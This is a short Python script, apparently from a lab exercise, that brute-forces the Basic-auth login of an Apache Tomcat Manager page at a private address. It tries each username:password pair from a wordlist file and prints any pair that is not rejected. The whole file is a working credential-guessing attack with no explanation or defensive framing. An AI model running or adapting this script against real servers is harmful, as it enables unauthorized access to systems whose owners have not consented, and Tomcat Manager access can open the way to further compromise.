import requests
import base64


url = "http://10.0.2.9:8080/manager/html"

f=open("tomcat_passwd.txt","r")

for creds in f:
	#print(creds)
	encoded = base64.b64encode(creds.strip().encode())
	#print(encoded.decode())
	headers = {'Authorization':'Basic '+encoded.decode()}
	response = requests.get(url,headers=headers)
	#print(response.status_code)
	if int(response.status_code)!=401:
		print(creds.strip())